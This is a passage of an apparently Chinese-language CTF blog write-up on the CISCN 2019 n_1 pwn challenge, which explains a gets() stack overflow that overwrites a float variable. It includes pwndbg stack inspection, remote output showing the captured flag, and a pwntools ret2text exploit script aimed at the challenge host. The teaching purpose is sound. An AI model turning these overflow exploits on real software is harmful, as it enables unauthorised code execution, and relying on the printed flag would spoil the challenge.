+</thead>
+<tbody><tr>
+<td><code>$xmm0.v4_float[0]</code></td>
+<td>当成 4 个 float，取第 0 个</td>
+</tr>
+<tr>
+<td><code>$xmm0.v4_int32[0]</code></td>
+<td>当成 4 个 32 位整数，取第 0 个</td>
+</tr>
+<tr>
+<td><code>$xmm0.v2_double[0]</code></td>
+<td>当成 2 个 double，取第 0 个</td>
+</tr>
+</tbody></table>
+<p>所以 <code>p $xmm0.v4_float[0]</code> 就是“把 <code>xmm0</code> 的低 32 位按 float 解释并打印”，结果是 <code>11.28125</code>，说明覆盖成功。</p>
+<p>如果此时还停在 <code>0x4006a2</code>（<code>movss</code> 还没执行），<code>xmm0</code> 里还是旧值。可以直接看内存：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(float*)($rbp-0x4)</span><br><span class="line">$2 = 11.28125</span><br><span class="line">pwndbg&gt; x/wx $rbp-0x4</span><br><span class="line">0x7ffc55f4b08c: 0x41348000</span><br></pre></td></tr></table></figure>
+
+<p>这两种写法不依赖 <code>movss</code> 有没有执行，更保险。</p>
+<h3 id="看栈"><a href="#看栈" class="headerlink" title="看栈"></a>看栈</h3><p>如果想看栈上的情况，用 pwndbg 的 <code>telescope</code> 或 <code>x</code>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope $rbp-0x40</span><br><span class="line">pwndbg&gt; x/80bx $rbp-0x40</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/06/pwn-ctf-ciscn-2019-n-1/image-9.png" alt="栈上的注入情况"></p>
+<p><em>图 9：<code>telescope</code> 和 <code>x/80bx</code> 都能看到 44 个 A 和后面的浮点数</em></p>
+<p>先看 <code>telescope</code> 的输出（地址因机器而异）：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00:0000 -040  0x7ffc55f4b050 &lt;- 1</span><br><span class="line">01:0008 -038  0x7ffc55f4b058 -&gt; 0x4006a2 (func+44) &lt;- movss xmm0, dword ptr [rbp - 4]</span><br><span class="line">02:0010 -030  0x7ffc55f4b060 &lt;- &#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span><br><span class="line">...</span><br><span class="line">07:0038 -008  0x7ffc55f4b088 &lt;- 0x4134800041414141 /* &#x27;AAAA&#x27; */</span><br></pre></td></tr></table></figure>
+
+<p>从下往上读：</p>
+<table>
+<thead>
+<tr>
+<th>位置</th>
+<th>值</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>rbp-0x30</code> 开始</td>
+<td><code>41 41 41 ...</code></td>
+<td>44 个 <code>A</code> 填满 <code>v1</code></td>
+</tr>
+<tr>
+<td><code>rbp-0x8</code> 这个 8 字节字</td>
+<td><code>0x4134800041414141</code></td>
+<td>低 4 字节还是 <code>A</code>，高 4 字节是浮点数</td>
+</tr>
+<tr>
+<td><code>rbp-0x4</code></td>
+<td><code>00 80 34 41</code></td>
+<td>浮点数 <code>11.28125</code>，成功覆盖</td>
+</tr>
+<tr>
+<td><code>rbp-0x38</code></td>
+<td><code>0x4006a2</code></td>
+<td>栈上残留的旧返回地址，不影响</td>
+</tr>
+</tbody></table>
+<p><code>0x4134800041414141</code> 这个值刚好把“最后 4 个 A”和“浮点数”拼在一个 8 字节里：按小端读，低地址的 4 个字节是 <code>41 41 41 41</code>，高地址的 4 个字节是 <code>00 80 34 41</code>。</p>
+<p>再用 <code>x/80bx</code> 一个字节一个字节地看，会更直观：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffc55f4b060: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41</span><br><span class="line">...</span><br><span class="line">0x7ffc55f4b088: 0x41 0x41 0x41 0x41 0x00 0x80 0x34 0x41</span><br></pre></td></tr></table></figure>
+
+<p>从 <code>rbp-0x30</code> 开始一路都是 <code>0x41</code>（字符 <code>A</code>），到 <code>rbp-0x4</code> 变成 <code>00 80 34 41</code>。<strong>这就是我们注入的情况，和预期完全一致。</strong></p>
+<p>再顺手确认一下比较用的常量：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/fw 0x4007f4</span><br><span class="line">0x4007f4: 11.28125</span><br><span class="line">pwndbg&gt; x/wx 0x4007f4</span><br><span class="line">0x4007f4: 0x41348000</span><br></pre></td></tr></table></figure>
+
+<p>常量和我们写进去的字节一模一样，<code>ucomiss</code> 比较时自然相等，程序会走 <code>system(&quot;cat /flag&quot;)</code> 分支。</p>
+<div class="note success flat"><p><strong>调试的目的不是“看个热闹”，而是逐项验证假设：</strong></p>
+<ol>
+<li>偏移 44 对不对 → 看 <code>rbp-0x30</code> 之后第 44 个字节是不是浮点数；</li>
+<li>字节序对不对 → 看 <code>rbp-0x4</code> 是不是 <code>00 80 34 41</code>；</li>
+<li>有没有写坏别的东西 → 看 <code>rbp</code> 和 <code>rbp+8</code> 有没有被动过。</li>
+</ol>
+<p>三项都对，payload 就是对的，远程打不通也只可能是网络或靶场问题。</p>
+</div>
+
+<h2 id="打远程，拿-flag"><a href="#打远程，拿-flag" class="headerlink" title="打远程，拿 flag"></a>打远程，拿 flag</h2><p>确认无误后，把 <code>gdb.debug</code> 换回 <code>remote</code>，运行：</p>
+<p><img src="/2026/11/06/pwn-ctf-ciscn-2019-n-1/image.png" alt="最终拿 flag"></p>
+<p><em>图 10：payload 发送成功，<code>cat /flag</code> 直接把 flag 打出来</em></p>
+<p>输出：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 752e0d41683080aa9389cc2c.tcp-ctf2.dasctf.com on port 9999: Done</span><br><span class="line">[*] Sending Payload (48bytes)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Let&#x27;s guess the number.</span><br><span class="line">CTF2&#123;37d9a42f-2f01-48ad-841c-9144b9ed20a7&#125;</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>
+
+<p>flag 是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF2&#123;37d9a42f-2f01-48ad-841c-9144b9ed20a7&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>Let&#39;s guess the number.</code> 是程序自己的提示，紧接着就是 <code>cat /flag</code> 的输出——没有 <code>$</code> 提示符，因为后门执行的是 <code>cat /flag</code>，不是 <code>/bin/sh</code>。执行完程序继续往下走，连接断开，pwntools 打印 <code>Got EOF</code>，这是正常收尾。</p>
+<div class="note info flat"><p><strong>顺带一个细节：<code>gets</code> 会自动补一个 <code>\0</code>。</strong></p>
+<p>我们发了 48 字节，<code>gets</code> 会在第 49 个位置（也就是 <code>rbp</code>）补一个 <code>\0</code>，把保存的 rbp 最低字节清零。返回地址在 <code>rbp+8</code>，没有被碰，所以 <code>system</code> 能正常执行、flag 能正常打印；但 <code>func</code> 返回之后 <code>main</code> 的收尾可能会踩到这个被改脏的 rbp，进程最后怎么退出就不一定很干净了。</p>
+<p><strong>这不影响拿 flag</strong>，看到 <code>Got EOF</code> 不用怀疑 exp。反过来说，如果你想验证自己真的理解了栈布局，可以想想“为什么第 49 个字节会落在 rbp 上”——答案是 <code>v1</code> 从 <code>rbp-0x30</code> 开始，<code>rbp-0x30 + 48 = rbp</code>。</p>
+</div>
+
+<h2 id="另一种打法：直接跳过判断"><a href="#另一种打法：直接跳过判断" class="headerlink" title="另一种打法：直接跳过判断"></a>另一种打法：直接跳过判断</h2><p>题目本意是让我们改 <code>v2</code>，但既然能溢出，其实还有一条路：<strong>不猜数字，直接把返回地址改成 <code>system</code> 那段代码</strong>。</p>
+<p>回头看汇编，<code>0x4006be</code> 就是 <code>system(&quot;cat /flag&quot;)</code> 的入口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x4006be &lt;+72&gt;: mov edi, 0x4007cc   ; &quot;cat /flag&quot;</span><br><span class="line">0x4006c3 &lt;+77&gt;: mov eax, 0</span><br><span class="line">0x4006c8 &lt;+82&gt;: call system@plt</span><br></pre></td></tr></table></figure>
+
+<p>跳到 <code>0x4006be</code>，就绕过了前面所有比较。返回地址在 <code>rbp+8</code>，从 <code>v1</code> 起点算是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x30（到 rbp）+ 8（跳过保存的 rbp）= 0x38 = 56</span><br></pre></td></tr></table></figure>
+
+<p>exp 改成：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;752e0d41683080aa9389cc2c.tcp-ctf2.dasctf.com&#x27;</span></span><br><span class="line">PORT = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">io = remote(HOST, PORT, ssl=<span class="literal">True</span>, sni=HOST)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">56</span></span><br><span class="line">payload += p64(<span class="number">0x4006be</span>)</span><br><span class="line">log.info(<span class="string">f&quot;Sending Payload (<span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>bytes)&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>payload 是 <code>56 + 8 = 64</code> 字节：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ 56 字节填充 ][ 0x4006be ]</span><br></pre></td></tr></table></figure>
+
+<p>为什么不担心栈对齐？因为我们是 <code>ret</code> 到 <code>0x4006be</code> 的，<code>ret</code> 之后 <code>rsp % 16 == 0</code>，而 <code>call system</code> 要求的正是 <code>call</code> 前 <code>rsp % 16 == 0</code>，刚好满足。这一点和 rip &#x2F; warmup 里“跳函数入口要处理 <code>push rbp</code>”不同：我们跳的是<strong>函数中间</strong>，不执行 <code>push rbp</code>，对齐天然是对的。</p>
+<p>两条路的对比：</p>
+<table>
+<thead>
+<tr>
+<th>路线</th>
+<th>payload</th>
+<th>依赖</th>
+<th>教学意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>改 <code>v2</code></td>
+<td>44 + 4 &#x3D; 48 字节</td>
+<td>浮点数的 IEEE 754 表示</td>
+<td>理解“溢出不一定打返回地址”</td>
+</tr>
+<tr>
+<td>改返回地址跳 <code>0x4006be</code></td>
+<td>56 + 8 &#x3D; 64 字节</td>
+<td>程序 No PIE、地址固定</td>
+<td>理解“跳过判断”的 ret2text 思路</td>
+</tr>
+</tbody></table>
+<div class="note warning flat"><p><strong>第二种打法只在 No PIE 时好用。</strong> 如果程序开了 PIE，<code>0x4006be</code> 每次运行都会变，得先泄露基址。第一种打法不依赖任何地址，只依赖变量的相对位置，通用性更强，也是出题人想考的点。</p>
+</div>
+
+<h2 id="新手常见问题"><a href="#新手常见问题" class="headerlink" title="新手常见问题"></a>新手常见问题</h2><details class="note nx-note info">
+<summary><p><strong>Q1：偏移为什么是 44，不是 48？</strong></p>
+</summary>
+<div class="nx-note__body"><p><code>48</code>（<code>0x30</code>）是整个局部变量区的大小，<code>44 + 4</code> 正好用完。但 <code>v2</code> 从 <code>rbp-0x4</code> 开始，距离 <code>v1</code> 起点 <code>rbp-0x30</code> 是 <code>0x2c = 44</code> 字节。填充 44 字节之后，接下来写的 4 字节才落在 <code>v2</code> 上。</p>
+</div>
+</details>
+
+<details class="note nx-note info">
+<summary><p><strong>Q2：为什么 payload 总长是 48，比偏移多 4？</strong></p>
+</summary>
+<div class="nx-note__body"><p><code>44</code> 是填充长度，后面还要写 4 字节浮点数，所以总长是 <code>44 + 4 = 48</code>。偏移是“走到目标变量起点”的距离，payload 长度是“填充 + 目标值”的总长度，两者不是一回事。</p>
+</div>
+</details>
+
+<details class="note nx-note info">
+<summary><p><strong>Q3：<code>struct.pack</code> 和 <code>p32</code> 有什么区别？</strong></p>
+</summary>
+<div class="nx-note__body"><p><code>p32(0x41348000)</code> 和 <code>struct.pack(&#39;&lt;f&#39;, 11.28125)</code> 得到的 4 个字节完全一样。区别在于 <code>p32</code> 需要你先手算浮点数的 IEEE 754 位模式，<code>struct.pack(&#39;&lt;f&#39;, ...)</code> 让 Python 按 C 的 <code>float</code> 语义帮你算。初学阶段用 <code>struct</code> 更不容易错，等熟练了直接写 <code>p32(0x41348000)</code> 也很常见。</p>
+</div>
+</details>
+
+<details class="note nx-note info">
+<summary><p><strong>Q4：为什么 <code>p $xmm0.v4_float[0]</code> 能看到 11.28125？</strong></p>
+</summary>
+<div class="nx-note__body"><p><code>xmm0</code> 是 128 位寄存器，<code>v4_float</code> 把它按 4 个单精度浮点数解释，<code>[0]</code> 取最低的 32 位。<code>movss xmm0, [rbp-0x4]</code> 执行后，低 32 位就是 <code>v2</code> 的位模式，按 float 解释正好是 <code>11.28125</code>。如果停在这条指令之前，<code>xmm0</code> 还是旧值，可以改用 <code>p *(float*)($rbp-0x4)</code>。</p>
+</div>
+</details>
+
+<details class="note nx-note info">
+<summary><p><strong>Q5：<code>gdb.debug</code> 报错 &#x2F; 不弹窗口怎么办？</strong></p>
+</summary>
+<div class="nx-note__body"><p><code>gdb.debug</code> 需要另开一个终端，<code>context.terminal</code> 必须写对。用 tmux 就先 <code>tmux</code> 进会话，再配 <code>[&quot;tmux&quot;, &quot;new-window&quot;]</code>；桌面环境可以试 <code>[&quot;gnome-terminal&quot;, &quot;--&quot;, &quot;bash&quot;, &quot;-c&quot;]</code> 或 <code>[&quot;xterm&quot;, &quot;-e&quot;, &quot;bash&quot;, &quot;-c&quot;]</code>。实在搞不定，可以先用 <code>process(&#39;./pwn3&#39;)</code> 跑通逻辑，再手动 <code>gdb -p</code> attach。</p>
+</div>
+</details>
+
+<details class="note nx-note info">
+<summary><p><strong>Q6：payload 里的 <code>\x00</code> 会被 <code>gets</code> 截断吗？</strong></p>
+</summary>
+<div class="nx-note__body"><p>不会。<code>gets</code> 是按字节读到换行或 EOF，<code>\x00</code> 只是普通字节，不是终止符。真正让 <code>gets</code> 停下的是 <code>sendline</code> 补的 <code>\n</code>。浮点数 <code>11.28125</code> 打包后第一个字节就是 <code>\x00</code>，如果 <code>gets</code> 会被 <code>\x00</code> 截断，这题根本没法做。</p>
+</div>
+</details>
+
+<details class="note nx-note info">
+<summary><p><strong>Q7：为什么这次没有崩，只看到 EOF？</strong></p>
+</summary>
+<div class="nx-note__body"><p>返回地址在 <code>rbp+8</code>，我们的 48 字节 payload 没有碰到它，所以 <code>func</code> 能正常返回、<code>system</code> 能正常执行。不过 <code>gets</code> 补的 <code>\0</code> 会落在 <code>rbp</code>，把保存的 rbp 最低字节清零，进程收尾时可能踩到脏的 rbp。flag 已经打印出来了，最后是 EOF 还是崩溃都无所谓。</p>
+</div>
+</details>
+
+<details class="note nx-note info">
+<summary><p><strong>Q8：远程连不上怎么办？</strong></p>
+</summary>
+<div class="nx-note__body"><p>先确认平台类型：<code>*.tcp-ctf2.dasctf.com</code> 这类走 TLS，必须 <code>remote(HOST, PORT, ssl=True, sni=HOST)</code>；普通 <code>nc</code> 靶场直接 <code>remote(HOST, PORT)</code>，加了 <code>ssl=True</code> 反而连不上。其次确认靶场没过期，这类临时地址失效是常态。</p>
+</div>
+</details>
+
+<details class="note nx-note info">
+<summary><p><strong>Q9：为什么 <code>11.28125</code> 能精确比较，别的数行不行？</strong></p>
+</summary>
+<div class="nx-note__body"><p><code>11.28125 = 11 + 9/32</code>，转成二进制是有限的 <code>1011.01001₂</code>，单精度 23 位尾数放得下，所以能精确表示。像 <code>0.1</code>、<code>11.1</code> 这种十进制有限但二进制无限循环的数，float 存进去会有舍入误差，用 <code>==</code> 比较就不可靠了。CTF 里遇到浮点数比较，先确认这个数是不是“二进制友好”的。</p>
+</div>
+</details>
+
+<details class="note nx-note info">
+<summary><p><strong>Q10：为什么这题不需要处理栈对齐？</strong></p>
+</summary>
+<div class="nx-note__body"><p>栈对齐只在“<code>call</code> 一条 libc 函数且栈位置不对”的时候才会出问题。这题走的是 <code>if</code> 分支，<code>system</code> 是函数自己 <code>call</code> 的，<code>rsp</code> 在函数内部天然对齐；另一种打法跳 <code>0x4006be</code>，<code>ret</code> 之后 <code>rsp % 16 == 0</code>，也正好满足 <code>call</code> 前的要求。所以两条路都不用额外加 <code>ret</code> gadget。</p>
+</div>
+</details>
+
+<h2 id="完整流程速查"><a href="#完整流程速查" class="headerlink" title="完整流程速查"></a>完整流程速查</h2><table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>目的</th>
+<th>操作</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>看文件类型</td>
+<td><code>file pwn3</code>，确认 <code>not stripped</code>、64 位</td>
+</tr>
+<tr>
+<td>2</td>
+<td>看保护</td>
+<td><code>checksec --file=pwn3</code>，No canary、No PIE、NX enabled</td>
+</tr>
+<tr>
+<td>3</td>
+<td>找入口</td>
+<td>IDA 打开，<code>main</code> 只调用 <code>func</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>找漏洞</td>
+<td><code>func</code> 里 <code>gets(v1)</code>，<code>v1</code> 在 <code>rbp-0x30</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>找目标</td>
+<td><code>float v2</code> 在 <code>rbp-0x4</code>，要等于 <code>11.28125</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>算偏移</td>
+<td><code>0x30 - 0x4 = 0x2c = 44</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>算浮点字节</td>
+<td><code>struct.pack(&#39;&lt;f&#39;, 11.28125)</code> → <code>00 80 34 41</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td>写 exp</td>
+<td><code>b&#39;A&#39;*44 + struct.pack(&#39;&lt;f&#39;, 11.28125)</code>，共 48 字节</td>
+</tr>
+<tr>
+<td>9</td>
+<td>gdb 验证</td>
+<td><code>gdb.debug</code> + <code>b func</code> + <code>ni</code> 到 <code>gets</code> 后，看 <code>xmm0</code> 和栈</td>
+</tr>
+<tr>
+<td>10</td>
+<td>打远程</td>
+<td>换回 <code>remote</code>，<code>sendline</code>，拿 flag</td>
+</tr>
+</tbody></table>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这道题表面上是“猜数字”，实际上把 pwn 入门里几个很容易被忽略的点串了起来：</p>
+<ul>
+<li><strong>栈溢出的目标不一定是返回地址</strong>。缓冲区后面紧挨着的局部变量，只要程序会用它做判断，就可以是溢出目标。这题的 <code>v2</code> 就在 <code>v1</code> 后面 44 字节处。</li>
+<li><strong>偏移要看变量地址，不要看栈帧大小</strong>。<code>0x30</code> 是整个局部变量区，<code>v2</code> 的起点是 <code>0x2c</code>，差 4 个字节就是另一条路。</li>
+<li><strong>浮点数在内存里是位模式</strong>。<code>11.28125</code> → <code>0x41348000</code> → 小端 <code>00 80 34 41</code>，和整数打包是两套东西，<code>struct.pack(&#39;&lt;f&#39;, ...)</code> 是最省心的写法。</li>
+<li><strong><code>&lt;f</code> 和 <code>&lt;d</code> 不能混</strong>。用错长度，不仅 <code>v2</code> 的值不对，还会顺手写坏保存的 rbp。</li>
+<li><strong>能打通不等于理解对了</strong>。用 <code>gdb.debug</code> 停在 <code>gets</code> 之后，看 <code>xmm0</code>、看 <code>rbp-0x4</code>、看栈上的字节，三项都对，才算真的验证过。</li>
+<li><strong><code>gets</code> 会补 <code>\0</code></strong>。第 49 个字节落在 <code>rbp</code> 上，这是很多“明明打进去了但退出不干净”的原因。</li>
+</ul>
+<p>下一题可以往这几个方向走：</p>
+<table>
+<thead>
+<tr>
+<th>方向</th>
+<th>要解决的问题</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>32 位 ret2text</td>
+<td>地址 4 字节，用 <code>p32</code>；参数从栈上传</td>
+</tr>
+<tr>
+<td>覆盖变量 + canary</td>
+<td>canary 在缓冲区和 rbp 之间，得先泄露</td>
+</tr>
+<tr>
+<td>有 PIE</td>
+<td>先泄露基址，再算真实地址</td>
+</tr>
+<tr>
+<td>没有后门</td>
+<td>ret2libc：泄露 libc 地址，找 <code>system</code> 和 <code>/bin/sh</code></td>
+</tr>
+<tr>
+<td>浮点数比较更复杂</td>
+<td>用 <code>struct</code> 精确还原 C 的数值类型</td>
+</tr>
+</tbody></table>
+<div class="note success flat"><p><strong>一条经验</strong>：看到 <code>gets</code> 之后，先问自己三个问题——<strong>写到哪、能写多长、写完谁会读</strong>。这题“写到 <code>v1</code>、能写无限长、<code>v2</code> 会被读”，答案自然就出来了。工具只是手，思路才是关键。</p>
+</div>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://github.com/Quellisya">Quellisya</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://quellisya.github.io/2026/11/06/pwn-ctf-ciscn-2019-n-1/">https://quellisya.github.io/2026/11/06/pwn-ctf-ciscn-2019-n-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Quellisya.github.io" target="_blank">Quellisya's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a><a class="post-meta__tags" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a><a class="post-meta__tags" href="/tags/pwntools/">pwntools</a><a class="post-meta__tags" href="/tags/pwndbg/">pwndbg</a><a class="post-meta__tags" href="/tags/gets/">gets</a><a class="post-meta__tags" href="/tags/%E6%B5%AE%E7%82%B9%E6%95%B0/">浮点数</a><a class="post-meta__tags" href="/tags/IEEE754/">IEEE754</a><a class="post-meta__tags" href="/tags/gdb/">gdb</a><a class="post-meta__tags" href="/tags/CISCN2019/">CISCN2019</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar-seal.svg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/11/05/pwn-ctf-warmup-csaw-2016/" title="Pwn 热身：CSAW 2016 warmup——没有符号表也能定位 main，两种方法绕过栈对齐"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Pwn 热身：CSAW 2016 warmup——没有符号表也能定位 main，两种方法绕过栈对齐</div></div><div class="info-2"><div class="info-item-1">从 stripped 的 ELF 入手，讲清楚 file / checksec 到底在看什么、没有符号表时怎么在 gdb 里定位 main、gets 写进 v5 时偏移为什么是 72 而不是 128+8，以及 64 位栈对齐的两种绕法：跳到 0x40060e 跳过 push rbp，或者用 ret gadget 再压一次栈。</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/11/02/pwn-ctf-rip/" title="Pwn 工具的基本使用：从搭环境到 BUUCTF rip 拿 shell"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-02</div><div class="info-item-2">Pwn 工具的基本使用：从搭环境到 BUUCTF rip 拿 shell</div></div><div class="info-2"><div class="info-item-1">从零把 pwn 环境搭好（gdb、pwndbg、pwntools、ROPgadget、one_gadget），再用 BUUCTF rip 走完第一道栈溢出：找后门、算偏移、处理栈对齐、写 exp 拿 shell。</div></div></div></a><a class="pagination-related" href="/2026/11/05/pwn-ctf-warmup-csaw-2016/" title="Pwn 热身：CSAW 2016 warmup——没有符号表也能定位 main，两种方法绕过栈对齐"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-05</div><div class="info-item-2">Pwn 热身：CSAW 2016 warmup——没有符号表也能定位 main，两种方法绕过栈对齐</div></div><div class="info-2"><div class="info-item-1">从 stripped 的 ELF 入手，讲清楚 file / checksec 到底在看什么、没有符号表时怎么在 gdb 里定位 main、gets 写进 v5 时偏移为什么是 72 而不是 128+8，以及 64 位栈对齐的两种绕法：跳到 0x40060e 跳过 push rbp，或者用 ret gadget 再压一次栈。</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar-seal.svg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Quellisya</div><div class="author-info-description">记录 CTF 与 Web 安全的学习笔记，把每一步讲清楚。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">80</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Quellisya"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Quellisya" target="_blank" title="Github"><i class="fab fa-github" style="color: #0f2f32;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">循墨迹读代码，借微光见漏洞。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%88%E4%BB%8E-file-%E5%92%8C-checksec-%E5%BC%80%E5%A7%8B"><span class="toc-text">先从 file 和 checksec 开始</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%A2%E8%BF%9B-IDA-%E7%9C%8B%E5%87%BD%E6%95%B0"><span class="toc-text">丢进 IDA 看函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%99%E9%A2%98%E4%B8%8D%E6%89%93%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="toc-text">为什么这题不打返回地址</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E7%9D%80%E6%B1%87%E7%BC%96%E5%86%8D%E7%9C%8B%E4%B8%80%E9%81%8D"><span class="toc-text">对着汇编再看一遍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#v2-0-0-%E6%98%AF%E6%80%8E%E4%B9%88%E5%86%99%E7%9A%84"><span class="toc-text">v2 &#x3D; 0.0 是怎么写的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gets-%E5%86%99%E5%88%B0%E5%93%AA%E9%87%8C"><span class="toc-text">gets 写到哪里</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AF%94%E8%BE%83%E5%92%8C%E5%88%86%E6%94%AF"><span class="toc-text">比较和分支</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%97%E5%81%8F%E7%A7%BB%EF%BC%9A44-%E6%98%AF%E6%80%8E%E4%B9%88%E6%9D%A5%E7%9A%84"><span class="toc-text">算偏移：44 是怎么来的</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E6%98%AF-48"><span class="toc-text">为什么不是 48</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-28125-%E5%9C%A8%E5%86%85%E5%AD%98%E9%87%8C%E9%95%BF%E4%BB%80%E4%B9%88%E6%A0%B7"><span class="toc-text">11.28125 在内存里长什么样</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 